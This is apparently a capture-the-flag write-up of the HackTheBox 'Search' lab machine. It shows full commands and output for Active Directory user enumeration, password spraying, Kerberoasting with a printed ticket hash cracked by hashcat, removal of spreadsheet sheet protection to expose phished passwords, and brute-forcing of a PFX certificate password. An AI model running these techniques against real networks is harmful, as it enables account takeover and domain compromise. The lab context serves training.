# HackTheBox - Search Write-up

![Screen Shot 2022-05-03 at 21 21 06](https://user-images.githubusercontent.com/87259078/166622797-62e39f90-14d5-490f-b8c0-5ab4a0153f49.png)

# Enumeration

```
🔥\> nmap -p- -sV -sC --min-rate 4500 --max-rtt-timeout 1500ms 10.10.11.129 --open
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-03 05:55 GMT
Nmap scan report for search.htb (10.10.11.129)
Host is up (0.15s latency).
Not shown: 65516 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Search &mdash; Just Testing IIS
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-01-03 05:56:16Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2022-01-03T05:57:46+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
| tls-alpn:
|_  http/1.1
|_ssl-date: 2022-01-03T05:57:46+00:00; +2s from scanner time.
|_http-server-header: Microsoft-IIS/10.0
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_http-title: Search &mdash; Just Testing IIS
| http-methods:
|_  Potentially risky methods: TRACE
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2022-01-03T05:57:46+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2022-01-03T05:57:46+00:00; +1s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2022-01-03T05:57:46+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
8172/tcp  open  ssl/http      Microsoft IIS httpd 10.0
| ssl-cert: Subject: commonName=WMSvc-SHA2-RESEARCH
| Not valid before: 2020-04-07T09:05:25
|_Not valid after:  2030-04-05T09:05:25
|_ssl-date: 2022-01-03T05:57:46+00:00; +2s from scanner time.
|_http-title: Site doesn't have a title.
| tls-alpn:
|_  http/1.1
|_http-server-header: Microsoft-IIS/10.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| smb2-time:
|   date: 2022-01-03T05:57:10
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
```

Nmap reveals a lot of open ports, most of them are Windows based ports. Add the domain to hosts file. Let’s look into web first.

![Image.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/42665094-C13D-44F4-B749-BE2962CA469F/630BA61F-6842-4688-A85D-94A7BA1EE502_2/eWOk8Ch4uX6nSYI8YtnRxxITXNfZDnIUt3lTWYuddRQz/Image.png)

![Image.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/42665094-C13D-44F4-B749-BE2962CA469F/170C8B05-87E4-459F-9140-6E0C5D3C45FD_2/HIXkowWSjvzWXjDgjZWQVue4aAe9yBXYxczBYUyiPE0z/Image.png)

Nothing much available on the web other than team members name. Let’s add these name to a file and enumerate valid usernames.

```
🔥\> ./kerbrute_linux_amd64 userenum users.txt -d search.htb --dc search.htb

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 01/03/22 - Ronnie Flathers @ropnop

2022/01/03 06:08:27 >  Using KDC(s):
2022/01/03 06:08:27 >   search.htb:88

2022/01/03 06:08:27 >  [+] VALID USERNAME:       Dax.Santiago@search.htb
2022/01/03 06:08:27 >  [+] VALID USERNAME:       Sierra.Frye@search.htb
2022/01/03 06:08:27 >  [+] VALID USERNAME:       Keely.Lyons@search.htb
2022/01/03 06:08:27 >  Done! Tested 8 usernames (3 valid) in 0.152 seconds
```

Out of eight users only three are valid. Let’s Try to query the domain for users with 'Do not require Kerberos pre-authentication' set and export their TGTs for cracking.

```
🔥\> GetNPUsers.py search.htb/ -usersfile users.txt
Impacket v0.9.25.dev1+20211027.123255.1dad8f7f - Copyright 2021 SecureAuth Corporation

[-] User Dax.Santiago doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Keely.Lyons doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Sierra.Frye doesn't have UF_DONT_REQUIRE_PREAUTH set
```

These accounts have not set to ‘Do not require pre-auth’. This means, we can't perform Kerberoasting attack, it requires a user with Pre-Authentication enabled. We can’t dump LDAP without a valid password of a user. There’s no any interesting directory’s to look into. However, there’s a image which has interesting information.

![Image.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/42665094-C13D-44F4-B749-BE2962CA469F/B67FF9FF-3FC3-4B84-8C9C-8465507CDDB7_2/FIH4FeUpNexk2vYY0tXY2vwfoEyeSnpn0x1CINZ5NoYz/Image.png)

If we look at the August 17 date, it says ‘Send password to Hope Sharp’ and password is mentioned `IsolationIsKey?` We have username and password of Hope user. We can perform password spaying on recently found accounts too.

```
🔥\> crackmapexec smb search.htb -u users.txt -p 'IsolationIsKey?' --shares
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Dax.Santiago:IsolationIsKey? STATUS_LOGON_FAILURE
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Keely.Lyons:IsolationIsKey? STATUS_LOGON_FAILURE
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Sierra.Frye:IsolationIsKey? STATUS_LOGON_FAILURE
```

As you can see, this password is not valid for any of the user which we found recently. Let’s try this password with Hope user.

```
🔥\> crackmapexec smb search.htb -u Hope.Sharp -p 'IsolationIsKey?' --shares
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\Hope.Sharp:IsolationIsKey?
SMB         10.10.11.129    445    RESEARCH         [+] Enumerated shares
SMB         10.10.11.129    445    RESEARCH         Share           Permissions     Remark
SMB         10.10.11.129    445    RESEARCH         -----           -----------     ------
SMB         10.10.11.129    445    RESEARCH         ADMIN$                          Remote Admin
SMB         10.10.11.129    445    RESEARCH         C$                              Default share
SMB         10.10.11.129    445    RESEARCH         CertEnroll      READ            Active Directory Certificate Services share
SMB         10.10.11.129    445    RESEARCH         helpdesk
SMB         10.10.11.129    445    RESEARCH         IPC$            READ            Remote IPC
SMB         10.10.11.129    445    RESEARCH         NETLOGON        READ            Logon server share
SMB         10.10.11.129    445    RESEARCH         RedirectedFolders$ READ,WRITE
SMB         10.10.11.129    445    RESEARCH         SYSVOL          READ            Logon server share
```

We have access to couple shared directory’s. Let’s look into them.

```
🔥\> smbclient //search.htb/RedirectedFolders$ -U Hope.Sharp
Enter WORKGROUP\Hope.Sharp's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  Dc        0  Mon Jan  3 06:23:12 2022
  ..                                 Dc        0  Mon Jan  3 06:23:12 2022
  abril.suarez                       Dc        0  Tue Apr  7 18:12:58 2020
  Angie.Duffy                        Dc        0  Fri Jul 31 13:11:32 2020
  Antony.Russo                       Dc        0  Fri Jul 31 12:35:32 2020
  belen.compton                      Dc        0  Tue Apr  7 18:32:31 2020
  Cameron.Melendez                   Dc        0  Fri Jul 31 12:37:36 2020
  chanel.bell                        Dc        0  Tue Apr  7 18:15:09 2020
  Claudia.Pugh                       Dc        0  Fri Jul 31 13:09:08 2020
  Cortez.Hickman                     Dc        0  Fri Jul 31 12:02:04 2020
  dax.santiago                       Dc        0  Tue Apr  7 18:20:08 2020
  Eddie.Stevens                      Dc        0  Fri Jul 31 11:55:34 2020
  edgar.jacobs                       Dc        0  Thu Apr  9 20:04:11 2020
  Edith.Walls                        Dc        0  Fri Jul 31 12:39:50 2020
  eve.galvan                         Dc        0  Tue Apr  7 18:23:13 2020
  frederick.cuevas                   Dc        0  Tue Apr  7 18:29:22 2020
  hope.sharp                         Dc        0  Thu Apr  9 14:34:41 2020
  jayla.roberts                      Dc        0  Tue Apr  7 18:07:00 2020
  Jordan.Gregory                     Dc        0  Fri Jul 31 13:01:06 2020
  payton.harmon                      Dc        0  Thu Apr  9 20:11:39 2020
  Reginald.Morton                    Dc        0  Fri Jul 31 11:44:32 2020
  santino.benjamin                   Dc        0  Tue Apr  7 18:10:25 2020
  Savanah.Velazquez                  Dc        0  Fri Jul 31 12:21:42 2020
  sierra.frye                        Dc        0  Thu Nov 18 01:01:46 2021
  trace.ryan                         Dc        0  Thu Apr  9 20:14:26 2020
```

More user information is present in this directory. Let’s add these to users.txt file. We can access Hope users directory, but for the rest we don’t have permission to read or list the contents.

Now we have a valid username and password, we can dump LDAP.

```
🔥\> bloodhound-python -u Hope.Sharp -p 'IsolationIsKey?' -ns 10.10.11.129 -d search.htb -c All
INFO: Found AD domain: search.htb
INFO: Connecting to LDAP server: research.search.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 113 computers
INFO: Connecting to LDAP server: research.search.htb
INFO: Found 106 users
INFO: Found 63 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers

----------SNIP----------
```

We have a vhost, let’s add that to host file. Now we can use this dump to visualize it using bloodhound GUI. Upload all the dumped data.

![shortest_path_to_admin.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/42665094-C13D-44F4-B749-BE2962CA469F/51BBE6CD-3132-468F-8571-1EF349813060_2/YqBHyvjalxQ15lrtlB9fH5eC5Xy0JglyBQmF1AT4ZKsz/shortest_path_to_admin.png)

This is the shortest path to domain admin. However, we don’t have access to any of the user who are member of ‘ITSEC’. We have access to ‘Hope Sharp’ user but she’s not a member of ITSEC. However, if we look for Kerberoastable Accounts, then we’d find two.

![Image.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/42665094-C13D-44F4-B749-BE2962CA469F/06F8CD34-05A8-4143-A7B4-E07DAE0635D0_2/cILkOSwsPLpU9dzdIA3TscMXmFjC19b0em4KuINGEBQz/Image.png)

This ‘Web_svc’ account is created by HelpDesk and it is temporary. It is being used as Web Service, so basically it is a service account.

![Image.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/42665094-C13D-44F4-B749-BE2962CA469F/288F987C-C22A-4D53-A703-97994D8ED43A_2/vqI5LDwcXsvlyKoA5N8izd64mnVFWcX48bPlagsLBi4z/Image.png)

The SPN is not null, so we can Kerberoast to extract service account credentials (hash) from Active Directory as a regular user without sending any packets to the target system.

![Screen Shot 2022-01-03 at 05.15.53.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/42665094-C13D-44F4-B749-BE2962CA469F/AA5A7480-FF40-4CB0-B8A9-3248B3D0EDE7_2/uRY3LytKyJRS5RtcREUbltZ5PP8iDM9ynxRDqEhxyyYz/Screen%20Shot%202022-01-03%20at%2005.15.53.png)

[Performing Kerberoasting without SPNs](https://swarm.ptsecurity.com/kerberoasting-without-spns/)

```
🔥\> GetUserSPNs.py -request -dc-ip 10.10.11.129 search.htb/Hope.Sharp:IsolationIsKey?
Impacket v0.9.25.dev1+20211027.123255.1dad8f7f - Copyright 2021 SecureAuth Corporation

ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon  Delegation
---------------------------------  -------  --------  --------------------------  ---------  ----------
RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 12:59:11.329031  <never>



$krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*$893ce4d4fcc86c204faebe423b7e32e2$688d48c5118241fb775a396b7ea89507226771354cab6d37718ea43a0de5cbaeb1f302b0568af858c8f791396faf53701c39406c4c7c305d26a02f2adbe7e33fff8fa129bcd93b5b8bff8813f5606275a3526c28667caffda890fb68e635ca843fa1c2d9702b69e211f9f68bbbbf1288b44d5917328e752faa420cd2a215a301302941b50a0d4a36f835751870557ef4b11556d298ebe31e5c7739f116d67f8e0e7847ae48b8cc09f130f0df5ed861f8c7820c99cfc46ad1fa2610db42c5b40ce6105112c6a8e1e84fa2de34eb3c7ba06bb1f541254eb67d2231905aa024fe913371ae8e2c9a5b8c5b771ff08009a1c1da75cfb12d4c46441776a128dc0a52544772a7331d41d61b66a4758fe19c839e754e63170fbdee1eb27783055773d7727fbc7ec2c6fb851321b9245c90433016b44118242f7f4742446c29a058b10deede1d667ca6bbb1fd9fcd0cbc7daf8990205a36229a722a3455172e9119c2355f75f4c4f4c029102e6b2e4758f154cfa4b10c837f6603d91e75ad908932675b4ae23090147b67e563999f33935a59a1418019e0d0ca9e785bf3695d4fe819f43603fd1de33b6538f686ace793f1ae2cf4b8f4c7f2984cd155c90298865163556c54808fed21c0d7163790e96bd0ad2545da36e0f3cb9763799d181272c706241a9064eb3ca8815843fb66af535e15d8158e48191c24bf8f6dc7fef76b3d195469893f967d748b9f9b8dac3b5d73a9a0bf1f59919acc0a0de4a11365caca6b40bd04f1de970fa06eba77a50ba868aa2d9289b06ef70e3569f474fffd43f220bf18beed7cc10ab759db547e6621c757b469f31404bbdbf035202b8fd9e9e2d45bafd78fccd1b2d224c6f290097bd47e3ce65c5d8f090a43fc3823fdd010fe75e81ff1dd3427fa5e248832910dcb76007a14bf1e84302920ab5620af3dcde32bc1a1c9c6017bd3e60c7f8452e1e6807a4d6916545a3cc8c0cb1ef1575ed1d216b16fa78bd352dc4e5eba2cc6a49b9289d7533e4276eef1fbae77f6d13bb58c2a0c50530f63320c90561c992929d077cae8f43bb515ad35668d864ae4ba7311d47e7322df34fcaff66690a3e1ef50d47357ff2d614a76f0c2c3aabcbaa127b918e42015023439c20b94cb9795856bdc7015de62a88e708749a766cbbf8b95f8eb082a282cd0fba765d213fa4c81b5428a74ba8fa276398b4810a6226a3a97d5c1f2808543d72989b1642b26ae84650927fe2cd362f457cec75a1320f682badae3518f37a45d144f86adacffde4a93a7840f46eac33a2dadf2d14650f30db3394539395a15c6e6da9d6ba97848f8d0ecf30a403d5c74ba927722361fd33eaf2829ab18706c4434a3e8a0800f2931f5692fd92f6f895d41a5b450da69f42ecdf15c6bf76368f317c575589540bd3cdfbaadea26ffc5ad1b81a4ba37c8304b939f5f5c924c896c85557b9170ca135c62d4107d1ce2186ee719
```

We got the hash of Web_svc service account. Let’s try to crack it.

```
🔥\> hashcat -m 13100 web_svc_hash /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

--------SNIP--------

$krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*$e53619cf90ce49f28580953ec9f6ae63$13d69c419359f08f2f4fee1108bde54e55d0d66bbde0100ebb225557a1a8796e177ba18c77560e5f885684d23ff16fcdc46dc7f04d2c3801ae95ef5e4e046d980e7368434482d886af645e57eb16aa7edd8043ed519ce3c7141075519d5ef47b97f6b187f06a242c518dd9e1966453dbed6a2bb1f9818293c6e05fd9cad8a5115ba592857848d8c93c34e650a531f548ecdd52abaa89491395376ab5005e204d08f8c8625730ffb76530c466229bce133b0c5563cdf6996ec3a6fa23f79f39db56480a45947f99f07c2236f04aa1bd58a9266d45804b4137b4fc02f9590c558bda6887430d797fda902524ec32866a752b695cc96ae3f7fd40a722f4749743a41eaa22114757ed4743f7327e7da8d24a1b6ef7859998a1a647c8e8c60f8a58bfccf427e55ad466b733635583efe39d4486f5b7dc4da262107be58f75be3fcb5cac629c9750ec37fe47e57913a9fa6350320510b81a9412e1fd588215260eb06ac483189fdbdf20354ac75e573891b17cd4df9bf9a60f18a025757df5cc94060874c11d24f4d25b0810ba915fb632411b40159b52fdd9dff6e27fbc8c2be375aa11d36fc29fcfbb3f5461bd1bd19266e957704c4d437af212f6c31435a3c4e2bb8a0a173c0b0ce31d67693b645f82f21e034ff85e047d31f86e246eedddc9427876206502c4c794f1cb85631495b2f75bbee7728818cfd9cf34333eab8438006c6d8641487b5dd3c1179a8d29dc84986cc3cb2d679d11a5399dd39da7c38be7ed3c4b7675f232a30c5e2b8b72068f4e5e34558748c507945b809bfcf6fe0d6ffe54211ce7406adadd8102042910700591ae6abac4804fa51ba93593fe4357855ec82543335c8549863b3a45f38469ce5cda5a08990145c8dd250f026c8f9642d8e00adc725baea72954b2154caf964fc3d7f84272199868b13f215e48f84fd32c1aa6fa3520722144e9dabf64ba0e4c0a96ce80717255bc1f5c12c4f3ed4321852ed09816faec1b58e1cb1127319fab84d34f343750e50444effccf9c3ce0a1b466ce6d2819c920f1ac02eac03da6e56401d129c27a7982548f5a22f79a2ddbc8c124d800641ef655398c89bbce54f06586341e5f3ba82b94811ede651da962e43b34eadf256330715bad0247052f0445d4011b4cff5c08e3cc957aabd6ec16c89943e598c9a1405c50df1ff18d0b1b830357afdb308f91b41d10cfc7a4c51ec7d46f932f44eaa72817c886be253ca779fed669d844ed00d17a729858d673656adbc714d1c89f59f56da67740012af9bf5240a1666d6e35f70a13fd691d3d0be93d98c13190143961cc97517ad3031a5a6fefe7366c19081af1e43c47a1b570340e99bf20f4937f9de75db0d45d86c3eaa24d908abe4a6f6761ba08ac7ed519984da01a4c0eb626df4ba1ad9ff2b2511c47a813b1ef9c6e13d1451d4c7bebffd7a9c19c0b26befe66d0dd253e14033dd84985b9f7fa:@3ONEmillionbaby

Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP

--------SNIP--------
```

We got the password for web_svc service account, let’s spray this password across all the accounts which we have found so far.

```
🔥\> crackmapexec smb search.htb -u users.txt -p '@3ONEmillionbaby' --continue-on-success
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\dave.simpson:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Dax.Santiago:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Keely.Lyons:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Sierra.Frye:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Kyla.Stewart:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Chris.Stewart:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Ben.Thompson:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Kaiara.Spencer:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\abril.suarez:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Angie.Duffy:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Antony.Russo:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\belen.compton:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Cameron.Melendez:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\chanel.bell:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Claudia.Pugh:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Cortez.Hickman:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\dax.santiago:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Eddie.Stevens:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\edgar.jacobs:@3ONEmillionbaby
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Edith.Walls:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\eve.galvan:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\frederick.cuevas:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\hope.sharp:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\jayla.roberts:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Jordan.Gregory:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\payton.harmon:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Reginald.Morton:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\santino.benjamin:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Savanah.Velazquez:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\sierra.frye:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\trace.ryan:@3ONEmillionbaby STATUS_LOGON_FAILURE
```

One user account is using the same password as service account. Let’s look into shares of that user.

```
🔥\> smbclient //search.htb/RedirectedFolders$ -U edgar.jacobs
Enter WORKGROUP\edgar.jacobs's password:
Try "help" to get a list of possible commands.
smb: \> cd edgar.jacobs\Desktop\
smb: \edgar.jacobs\Desktop\> ls
  .                                 DRc        0  Mon Aug 10 10:02:16 2020
  ..                                DRc        0  Mon Aug 10 10:02:16 2020
  $RECYCLE.BIN                     DHSc        0  Thu Apr  9 20:05:29 2020
  desktop.ini                      AHSc      282  Mon Aug 10 10:02:16 2020
  Microsoft Edge.lnk                 Ac     1450  Thu Apr  9 20:05:03 2020
  Phishing_Attempt.xlsx              Ac    23130  Mon Aug 10 10:35:44 2020

                3246079 blocks of size 4096. 458055 blocks available
smb: \edgar.jacobs\Desktop\> get Phishing_Attempt.xlsx
```

There’s a XLS file, download that to your machine.

![Image.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/42665094-C13D-44F4-B749-BE2962CA469F/BD5BC91C-4CC8-4E9D-960E-90C4824E9FA6_2/M42UbHZhH6TJkfTPQD94gQIDsvBl06Mam3mo5Aw6kMkz/Image.png)

This XLS document has two sheets, one of them has captured passwords of phishing and another has a list of username. As you can see the lock symbol on second sheet, a column is being locked with a password.

![Image.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/42665094-C13D-44F4-B749-BE2962CA469F/237F6E05-036A-4545-9872-6DC8B9337CFF_2/8nLaUtmwK66ITgZvtGdwS5pavgXlH4JaIo36LjuvXV4z/Image.png)

You can confirm it by resizing the cell which is in between lastname and Username. There are two ways to remove the password. Upload it on google drive and access it via sheets, it will remove the password for you. This is the easiest way. If you want to remove it manually, then you need unzip this xlsx file and delete the below link from the sheet2.xml file.

`<sheetProtection algorithmName="SHA-512" hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>`

You can find this ‘sheet2.xml’ file after unzipping the xlsx file. Location: `xl/worksheets/sheet2.xml`  Once you delete that line, you need to zip it back.

```
🔥\> zip -r Phishing.xls .
```

Open the xls file and double click on the line which is between D and B to see the passwords.

![Image.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/42665094-C13D-44F4-B749-BE2962CA469F/D9480F1F-CE79-47E8-BDAC-9FDFE5724FD6_2/aCKTZ55gnPus42W7qiGxbMHxw9i1GbkuCdDoXyvWL44z/Image.png)

Now we have 15 more username & passwords. If we look at the bloodhound visual path to domain admin, out of all the users, there are only two are in the password list. Abby and Sierra will lead to domain admin. The Abby password didn’t work, but Sierra’s did.

```
🔥\> smbclient //search.htb/RedirectedFolders$ -U Sierra.Frye
Enter WORKGROUP\Sierra.Frye's password:
Try "help" to get a list of possible commands.
smb: \> cd sierra.frye\Desktop\
smb: \sierra.frye\Desktop\> ls
  .                                 DRc        0  Thu Nov 18 01:08:00 2021
  ..                                DRc        0  Thu Nov 18 01:08:00 2021
  $RECYCLE.BIN                     DHSc        0  Tue Apr  7 18:03:59 2020
  desktop.ini                      AHSc      282  Fri Jul 31 14:42:15 2020
  Microsoft Edge.lnk                 Ac     1450  Tue Apr  7 12:28:05 2020
  user.txt                           Ac       33  Thu Nov 18 00:55:27 2021

                3246079 blocks of size 4096. 459005 blocks available
smb: \sierra.frye\Desktop\> get user.txt
getting file \sierra.frye\Desktop\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```

We have user flag now.

```
smb: \sierra.frye\Downloads\Backups\> ls
  .                                 DHc        0  Mon Aug 10 20:39:17 2020
  ..                                DHc        0  Mon Aug 10 20:39:17 2020
  search-RESEARCH-CA.p12             Ac     2643  Fri Jul 31 15:04:11 2020
  staff.pfx                          Ac     4326  Mon Aug 10 20:39:17 2020

                3246079 blocks of size 4096. 458996 blocks available
```

Under Downloads we will find Cryptography files. Let’s download them to our machine.

> A p12 file contains a digital certificate that uses PKCS#12 (Public Key Cryptography Standard #12) encryption. It is used as a portable format for transferring personal private keys and other sensitive information. P12 files are used by various security and encryption programs. It is generally referred to as a "PFX file”.

We can try to upload this certificate to browser (firefox).

![Image.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/42665094-C13D-44F4-B749-BE2962CA469F/8572517F-9980-4178-89BC-2F0E2EDDAB47_2/8xbxgAVMhZiRN5Pa8zMhkEIgYyUsXiRE4mX2D3xlxnsz/Image.png)

It asks for the password. We can try to crack the password using bellow tool.

[GitHub - Ridter/p12tool: A simple Go script to brute force or parse a password-protected PKCS#12 (PFX/P12) file.](https://github.com/Ridter/p12tool)

```
🔥\> ./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt

██████╗  ██╗██████╗ ████████╗ ██████╗  ██████╗ ██╗
██╔══██╗███║╚════██╗╚══██╔══╝██╔═══██╗██╔═══██╗██║
██████╔╝╚██║ █████╔╝   ██║   ██║   ██║██║   ██║██║
██╔═══╝  ██║██╔═══╝    ██║   ██║   ██║██║   ██║██║
██║      ██║███████╗   ██║   ╚██████╔╝╚██████╔╝███████╗
╚═╝      ╚═╝╚══════╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝

Version: 1.0 (n/a) - 01/03/22 - Evi1cg

2022/01/03 02:34:13 ->  [*] Brute forcing...
2022/01/03 02:34:13 ->  [*] Start thread num 100
2022/01/03 03:01:44 ->  [+] Password found ==> misspissy
2022/01/03 03:01:44 ->  [*] Successfully cracked password after 5484391 attempts!
```

If you are on VM then it’d take much more time. Now we have the password for the certificate. Let’s add it in our browser.

![Image.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/42665094-C13D-44F4-B749-BE2962CA469F/14533AEF-19A6-4437-9E3E-F8DFD8ACBF57_2/i6tmLG0hMGUfxS7RoijyodWtGVMIR3PVRKAxflxltmMz/Image.png)

There’s a specific endpoint which you can access with this certificate.

